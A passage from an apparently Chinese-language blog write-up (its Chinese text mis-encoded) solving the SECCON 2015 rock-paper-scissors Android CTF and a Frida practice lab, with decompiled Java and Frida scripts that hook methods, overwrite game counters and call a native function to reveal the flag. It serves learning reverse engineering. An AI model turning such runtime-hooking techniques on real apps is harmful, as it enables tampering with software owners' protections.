super.<span class="built_in">onCreate</span>(savedInstanceState);</span><br><span class="line">    <span class="built_in">setContentView</span>(R.layout.activity_main);</span><br><span class="line">    <span class="keyword">this</span>.P = (Button) <span class="built_in">findViewById</span>(R.id.button);</span><br><span class="line">    <span class="keyword">this</span>.S = (Button) <span class="built_in">findViewById</span>(R.id.button3);</span><br><span class="line">    <span class="keyword">this</span>.r = (Button) <span class="built_in">findViewById</span>(R.id.buttonR);</span><br><span class="line">    <span class="keyword">this</span>.P.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.r.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.S.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.flag = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè°ƒç”¨çˆ¶ç±»(Activity)çš„ <code>onCreate</code> æ–¹æ³•ï¼ˆå¿…é¡»ï¼‰</p><p><code>setContentView(R.layout.activity_main);</code>è¿™æ˜¯å°†XMLå¸ƒå±€æ–‡ä»¶æ¸²æŸ“æˆå¯è§†åŒ–çš„ç•Œé¢ï¼Œåœ¨jadxé‡ŒåŒå‡»å¯ä»¥å‘ç°å®šä¹‰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">int</span> activity_main = <span class="number">0x7f040018</span>;</span><br></pre></td></tr></table></figure><ol><li>ä¼ å…¥èµ„æºID <code>0x7f040018</code></li><li>ç³»ç»Ÿè§£æï¼š<ul><li>åŒ…ID 0x7f â†’ å½“å‰åº”ç”¨èµ„æº</li><li>ç±»å‹ID 0x04 â†’ layoutç±»å‹</li><li>é¡¹ID 0x0018 â†’ ç¬¬24ä¸ªlayoutèµ„æº</li></ul></li><li>æŸ¥æ‰¾ resources.arsc è¡¨</li><li>æ‰¾åˆ°å¯¹åº”çš„ activity_main.xml æ–‡ä»¶</li><li>åŠ è½½å¹¶æ¸²æŸ“å¸ƒå±€</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.P = (Button) <span class="built_in">findViewById</span>(R.id.button);</span><br><span class="line"><span class="keyword">this</span>.S = (Button) <span class="built_in">findViewById</span>(R.id.button3);</span><br><span class="line"><span class="keyword">this</span>.r = (Button) <span class="built_in">findViewById</span>(R.id.buttonR);</span><br></pre></td></tr></table></figure><p>è·å–å¸ƒå±€æ–‡ä»¶ä¸­å®šä¹‰çš„æŒ‰é’®ç©ºé—´å¼•ç”¨ï¼Œè·Ÿä¸Šè¿°çš„èµ„æºIDæ˜¯ç±»ä¼¼çš„</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.P.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br><span class="line"><span class="keyword">this</span>.r.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br><span class="line"><span class="keyword">this</span>.S.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br></pre></td></tr></table></figure><p>ä¸ºè¿™äº›æŒ‰é’®è®¾ç½®ç‚¹å‡»äº‹ä»¶ç›‘è§†å™¨</p><p>ä¹‹åè®¾ç½®flag&#x3D;0å®Œæˆåˆå§‹åŒ–ï¼›</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">@Override <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.flag != <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.flag = <span class="number">1</span>;</span><br><span class="line">        TextView result = (TextView) <span class="built_in">findViewById</span>(R.id.textView3);</span><br><span class="line">        result.<span class="built_in">setText</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        TextView user = (TextView) <span class="built_in">findViewById</span>(R.id.textView);</span><br><span class="line">        TextView laptop = (TextView) <span class="built_in">findViewById</span>(R.id.textView2);</span><br><span class="line">        <span class="keyword">this</span>.m = <span class="number">0</span>;</span><br><span class="line">        Random rm = <span class="keyword">new</span> <span class="built_in">Random</span>();</span><br><span class="line">        <span class="keyword">this</span>.n = rm.<span class="built_in">nextInt</span>(<span class="number">3</span>);</span><br><span class="line">        String[] ss = &#123;<span class="string">&quot;CPU: Paper&quot;</span>, <span class="string">&quot;CPU: Rock&quot;</span>, <span class="string">&quot;CPU: Scissors&quot;</span>&#125;;</span><br><span class="line">        laptop.<span class="built_in">setText</span>(ss[<span class="keyword">this</span>.n]);</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="keyword">this</span>.P) &#123;</span><br><span class="line">            user.<span class="built_in">setText</span>(<span class="string">&quot;YOU: Paper&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>.m = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="keyword">this</span>.r) &#123;</span><br><span class="line">            user.<span class="built_in">setText</span>(<span class="string">&quot;YOU: Rock&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>.m = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="keyword">this</span>.S) &#123;</span><br><span class="line">            user.<span class="built_in">setText</span>(<span class="string">&quot;YOU: Scissors&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>.m = <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.handler.<span class="built_in">postDelayed</span>(<span class="keyword">this</span>.showMessageTask, <span class="number">1000L</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç‚¹å‡»ä¹‹åå°±ä¼šè§¦å‘onClickï¼Œé€»è¾‘å¾ˆç®€å•ï¼Œç”µè„‘ä¼šéšæœºè¾“å‡ºï¼Œç„¶åæ¯”å¯¹ï¼Œä¹‹åå»¶è¿Ÿ1sé€šè¿‡this.showMessageTaskæ¥æ˜¾ç¤ºç»“æœ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Handler handler = <span class="keyword">new</span> <span class="built_in">Handler</span>();</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Runnable showMessageTask = <span class="keyword">new</span> <span class="built_in">Runnable</span>() &#123; <span class="comment">// from class: com.example.seccon2015.rock_paper_scissors.MainActivity.1</span></span><br><span class="line">    @Override <span class="comment">// java.lang.Runnable</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">run</span>() &#123;</span><br><span class="line">        TextView tv3 = (TextView) MainActivity.<span class="keyword">this</span>.<span class="built_in">findViewById</span>(R.id.textView3);</span><br><span class="line">        <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.n - MainActivity.<span class="keyword">this</span>.m == <span class="number">1</span>) &#123;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.cnt++;</span><br><span class="line">            tv3.<span class="built_in">setText</span>(<span class="string">&quot;WIN! +&quot;</span> + String.<span class="built_in">valueOf</span>(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m - MainActivity.<span class="keyword">this</span>.n == <span class="number">1</span>) &#123;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.cnt = <span class="number">0</span>;</span><br><span class="line">            tv3.<span class="built_in">setText</span>(<span class="string">&quot;LOSE +0&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m == MainActivity.<span class="keyword">this</span>.n) &#123;</span><br><span class="line">            tv3.<span class="built_in">setText</span>(<span class="string">&quot;DRAW +&quot;</span> + String.<span class="built_in">valueOf</span>(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m &lt; MainActivity.<span class="keyword">this</span>.n) &#123;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.cnt = <span class="number">0</span>;</span><br><span class="line">            tv3.<span class="built_in">setText</span>(<span class="string">&quot;LOSE +0&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.cnt++;</span><br><span class="line">            tv3.<span class="built_in">setText</span>(<span class="string">&quot;WIN! +&quot;</span> + String.<span class="built_in">valueOf</span>(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">1000</span> == MainActivity.<span class="keyword">this</span>.cnt) &#123;</span><br><span class="line">            tv3.<span class="built_in">setText</span>(<span class="string">&quot;SECCON&#123;&quot;</span> + String.<span class="built_in">valueOf</span>((MainActivity.<span class="keyword">this</span>.cnt + MainActivity.<span class="keyword">this</span>.<span class="built_in">calc</span>()) * <span class="number">107</span>) + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        MainActivity.<span class="keyword">this</span>.flag = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è®¾ç½®ä¸€ä¸ªRunnableæ¥å£ï¼Œå…¶ä¸­this.handler.postDelayed(this.showMessageTask, 1000L);ä¼šè°ƒç”¨è¯¥æ¥å£çš„runå‡½æ•°ä¸”è¿™ä¸ªæ¥å£ä¹Ÿåªèƒ½æœ‰ä¸€ä¸ªrunå‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ç‚¹å‡»äº‹ä»¶è§¦å‘</span><br><span class="line">    â†“</span><br><span class="line">handler.postDelayed(task, 1000)</span><br><span class="line">    â†“</span><br><span class="line">Handlerå°†Runnableå°è£…ä¸ºMessageåŠ å…¥æ¶ˆæ¯é˜Ÿåˆ—</span><br><span class="line">    â†“ (1ç§’å)</span><br><span class="line">ä¸»çº¿ç¨‹Looperå–å‡ºMessage</span><br><span class="line">    â†“</span><br><span class="line">Handleræ‰§è¡ŒMessage.callback.run()</span><br><span class="line">    â†“</span><br><span class="line">æˆ‘ä»¬çš„showMessageTask.run()è¢«æ‰§è¡Œ</span><br></pre></td></tr></table></figure><p>å‘ç°å½“è¿èƒœæ¬¡æ•°ä¸º1000æ—¶èƒ½è·å¾—ä¸€ä¸ªflag</p><h3 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;activity android:name=<span class="string">&quot;com.example.seccon2015.rock_paper_scissors.MainActivity&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>AndroidManifest.xmlæŸ¥çœ‹ç¨‹åºçš„å…¥å£Activity</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[V2185A::PID::<span class="number">4093</span> ]-&gt; Java.<span class="built_in">perform</span>(<span class="built_in">function</span> () &#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&#x27;com.example.seccon2015.rock_paper_scissors.MainActivity&#x27;</span>);</span><br><span class="line">    MainActivity.onClick.implementation = <span class="built_in">function</span> (v) &#123;</span><br><span class="line">        <span class="built_in">send</span>(<span class="string">&quot;hook start&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">[V2185A::PID::<span class="number">4093</span> ]-&gt; message: &#123;<span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;send&#x27;</span>, <span class="string">&#x27;payload&#x27;</span>: <span class="string">&#x27;hook start&#x27;</span>&#125; data: None</span><br></pre></td></tr></table></figure><p>fridaä¸­ä½¿ç”¨MainActivity.onClick.implementationæ¥è¿›è¡Œå¯¹å‡½æ•°çš„hook</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, <span class="function">sys</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line"><span class="function">    print(message)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">jscode =</span> <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    var MainActivity = Java.use(&quot;</span>com.example.seccon2015.rock_paper_scissors.MainActivity<span class="string">&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    MainActivity.onClick.implementation = function(v)&#123;</span></span><br><span class="line"><span class="string">        this.onClick(v);</span></span><br><span class="line"><span class="string">        this.n.value = 2;</span></span><br><span class="line"><span class="string">        this.m.value = 1;</span></span><br><span class="line"><span class="string">        this.cnt.value = 999;</span></span><br><span class="line"><span class="string">        send(this.m.value);</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">device = frida.<span class="built_in">get_usb_device</span>(<span class="number">1000</span>)  <span class="comment">//è®¾å¤‡è¿æ¥ è¶…æ—¶1s</span></span><br><span class="line"></span><br><span class="line">process = device.<span class="built_in">attach</span>(<span class="number">4836</span>) <span class="comment">// attack pid</span></span><br><span class="line">script = process.<span class="built_in">create_script</span>(jscode)  <span class="comment">//hookè„šæœ¬</span></span><br><span class="line">script.<span class="built_in">on</span>(<span class="string">&#x27;message&#x27;</span>, on_message)    <span class="comment">//ä¿¡æ¯å›è°ƒ</span></span><br><span class="line">script.<span class="built_in">load</span>()   <span class="comment">//è¿è¡Œè„šæœ¬</span></span><br><span class="line"></span><br><span class="line">sys.stdin.<span class="built_in">read</span>() <span class="comment">//ä¿æŒè„šæœ¬è¿è¡Œ</span></span><br></pre></td></tr></table></figure><p><strong>hookå†…éƒ¨ç±»</strong></p><p>å¯ä»¥ç›´æ¥è€ƒè™‘hookæ‰<code>com.example.seccon2015.rock_paper_scissors.MainActivity.1</code>ï¼Œè¿™æ˜¯showMessageTaskæ¥å£</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, <span class="function">sys</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line"><span class="function">    print(message)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">jscode =</span> <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    var MainActivity = Java.use(&quot;</span>com.example.seccon2015.rock_paper_scissors.MainActivity$<span class="number">1</span><span class="string">&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    MainActivity.run.implementation = function(v)&#123;</span></span><br><span class="line"><span class="string">        this.this$0.value.m.value=1;</span></span><br><span class="line"><span class="string">        this.this$0.value.n.value=2;</span></span><br><span class="line"><span class="string">        this.this$0.value.cnt.value=999;</span></span><br><span class="line"><span class="string">        this.run();</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">device = frida.<span class="built_in">get_usb_device</span>(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">process = device.<span class="built_in">attach</span>(<span class="number">4836</span>)</span><br><span class="line">script = process.<span class="built_in">create_script</span>(jscode)</span><br><span class="line">script.<span class="built_in">on</span>(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.<span class="built_in">load</span>()</span><br><span class="line"></span><br><span class="line">sys.stdin.<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure><p>è¦<code>com.example.seccon2015.rock_paper_scissors.MainActivity$1</code>è¿™ä¹ˆå†™ï¼Œç„¶åå°±ä¸èƒ½åƒä¹‹å‰ä¸€æ ·ç›´æ¥this.mè°ƒç”¨äº†ï¼Œå› ä¸ºshowMessageTaskæ˜¯å†…éƒ¨ç±»ï¼Œjavaä¸ºæ¯ä¸ªå†…éƒ¨ç±»è‡ªåŠ¨åˆ›å»ºäº†ä¸€ä¸ªæŒ‡å‘å¤–éƒ¨ç±»å®ä¾‹çš„å­—æ®µï¼Œé€šå¸¸å‘½åä¸º<code>this$0</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Java.Field&#123;</span><br><span class="line">holder: com.example.seccon2015.rock_paper_scissors.MainActivity$<span class="number">1</span>@732991e,</span><br><span class="line">fieldType: <span class="number">2</span>,</span><br><span class="line">fieldReturnType: Lcom/example/seccon2015/rock_paper_scissors/MainActivity;,</span><br><span class="line">value: com.example.seccon2015.rock_paper_scissors.MainActivity@8d9c04,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°valueå°±æ˜¯æƒ³è¦çš„å€¼ï¼Œ é‚£ä¹ˆç›´æ¥<code>this.this$0.value.m.value</code>è·å–å³å¯</p><p><strong>ç›´æ¥è°ƒç”¨æ–¹æ³•</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="number">1000</span> == MainActivity.<span class="keyword">this</span>.cnt) &#123;</span><br><span class="line">tv3.<span class="built_in">setText</span>(<span class="string">&quot;SECCON&#123;&quot;</span> + String.<span class="built_in">valueOf</span>((MainActivity.<span class="keyword">this</span>.cnt + MainActivity.<span class="keyword">this</span>.<span class="built_in">calc</span>()) * <span class="number">107</span>) + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>()&#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.example.seccon2015.rock_paper_scissors.MainActivity&quot;</span>);</span><br><span class="line">    MainActivity.onClick.implementation = <span class="built_in">function</span>(v)&#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">onClick</span>(v);</span><br><span class="line">        console.<span class="built_in">log</span>((<span class="number">1000</span> + <span class="keyword">this</span>.<span class="built_in">calc</span>())*<span class="number">107</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯å¯ä»¥çš„</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>()&#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.example.seccon2015.rock_paper_scissors.MainActivity&quot;</span>);</span><br><span class="line">    MainActivity.onClick.implementation = <span class="built_in">function</span>(v)&#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">onClick</span>(v);</span><br><span class="line">        var modules = Process.<span class="built_in">enumerateModules</span>();</span><br><span class="line">        <span class="keyword">for</span>(var i in modules)&#123;</span><br><span class="line">            <span class="comment">// console.log(modules[i].name);</span></span><br><span class="line">            <span class="keyword">if</span> (modules[i].name == <span class="string">&quot;libcalc.so&quot;</span>)&#123;</span><br><span class="line">                var exports = modules[i].<span class="built_in">enumerateExports</span>();</span><br><span class="line">                <span class="keyword">for</span>(var j in exports)&#123;</span><br><span class="line">                    console.<span class="built_in">log</span>(exports[j].name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>åˆ—ä¸¾è¾“å‡º<code>libcalc.so</code>åŠ¨æ€åº“å¯¼å‡ºçš„å‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>()&#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.example.seccon2015.rock_paper_scissors.MainActivity&quot;</span>);</span><br><span class="line">    MainActivity.onClick.implementation = <span class="built_in">function</span>(v)&#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">onClick</span>(v);</span><br><span class="line">        var addr = Module.<span class="built_in">findExportByName</span>(<span class="string">&quot;libcalc.so&quot;</span>,<span class="string">&quot;Java_com_example_seccon2015_rock_1paper_1scissors_MainActivity_calc&quot;</span>);</span><br><span class="line">        console.<span class="built_in">log</span>(addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>è¾“å‡º<code>Java_com_example_seccon2015_rock_1paper_1scissors_MainActivity_calc</code>è¿™ä¸ªç¬¦å·å¯¹åº”æ–¹æ³•çš„åœ°å€</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>()&#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.example.seccon2015.rock_paper_scissors.MainActivity&quot;</span>);</span><br><span class="line">    MainActivity.onClick.implementation = <span class="built_in">function</span>(v)&#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">onClick</span>(v);</span><br><span class="line">        var addr = Module.<span class="built_in">findExportByName</span>(<span class="string">&quot;libcalc.so&quot;</span>,<span class="string">&quot;Java_com_example_seccon2015_rock_1paper_1scissors_MainActivity_calc&quot;</span>);</span><br><span class="line">        console.<span class="built_in">log</span>(addr);</span><br><span class="line">        var func = <span class="keyword">new</span> <span class="built_in">NativeFunction</span>(addr,<span class="string">&quot;int&quot;</span>,[]);</span><br><span class="line">        console.<span class="built_in">log</span>(<span class="built_in">func</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>NativeFunction</code>å¾—åˆ°å¯¹åº”çš„æ–¹æ³•ï¼Œå¹¶ä¹‹åè¿è¡Œè¯¥å‡½æ•°</p><h2 id="lab"><a href="#lab" class="headerlink" title="lab"></a>lab</h2><h3 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h3><p>ä¸€ä¸ªçŒœæ•°å­—çš„ï¼Œç›´æ¥hookæ‰onClickè°ƒç”¨checkå¸¦æœ‰å›ºå®šå‚æ•°å³å¯</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, <span class="function">sys</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line"><span class="function">    print(message)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">jscode =</span> <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    var MainActivity = Java.use(&quot;</span>com.ad2001.frida0x1.MainActivity$<span class="number">1</span><span class="string">&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    MainActivity.onClick.implementation = function(v)&#123;</span></span><br><span class="line"><span class="string">        this.this$0.value.check(1,6);</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">device = frida.<span class="built_in">get_usb_device</span>(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">process = device.<span class="built_in">attach</span>(<span class="number">5409</span>)</span><br><span class="line">script = process.<span class="built_in">create_script</span>(jscode)</span><br><span class="line">script.<span class="built_in">on</span>(<span 